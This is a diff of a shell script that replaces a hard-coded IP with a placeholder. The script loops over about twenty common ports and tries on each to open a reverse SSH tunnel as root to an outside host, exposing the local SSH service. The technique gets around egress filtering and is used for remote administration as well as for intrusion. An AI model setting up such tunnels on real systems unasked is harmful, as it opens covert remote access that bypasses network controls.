@@ -17,7 +17,7 @@ echo "|H|u|n|t|i|n|g| |F|o|r| |A| |T|u|n|n|e|l|.|.|.|"
 echo "+-+-+-+-+-+-+-+ +-+-+-+ +-+ +-+-+-+-+-+-+-+-+-+"
 echo ""
 
-host="74.208.182.71"
+host="IP or Hostname Here"
 for i in $( echo -e "21\n22\n23\n20\n25\n53\n80\n110\n143\n443\n465\n587\n993\n995\n3128\n3389\n5060\n5500\n8443\n1494\n8080\n" ); 
   do
     /usr/bin/ssh -o ConnectTimeout=10 ExitOnForwardFailure=yes -N -R 5$i:localhost:22 root@$host -p$i
